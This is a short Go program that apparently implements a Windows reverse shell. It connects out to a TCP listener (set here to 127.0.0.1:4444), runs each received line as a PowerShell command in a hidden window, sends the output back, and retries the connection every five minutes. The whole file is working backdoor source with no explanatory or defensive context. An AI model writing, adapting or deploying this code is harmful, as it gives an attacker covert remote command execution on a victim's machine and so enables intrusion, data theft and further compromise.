package main

import (
	"bufio"
	"net"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

var host string = "127.0.0.1:4444"

func execComm(conn net.Conn) {
	for {
		connBuffer := bufio.NewReader(conn)
		str, err := connBuffer.ReadString('\n')

		if err != nil {
			conn.Close()
			connect()
		}

		inputSlice := strings.Fields(str)
		cmd := exec.Command("powershell", inputSlice...) //.Output()
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, err := cmd.CombinedOutput()
		if err != nil {
			execComm(conn)
		}
		conn.Write(out)

	}

}

func connect() {
	conn, err := net.Dial("tcp", host)

	if err != nil {
		if conn != nil {
			conn.Close()
			time.Sleep(5 * time.Minute)
			connect()
		}
		time.Sleep(5 * time.Minute)
		connect()
	}
	execComm(conn)
}

func main() {
	connect()
}
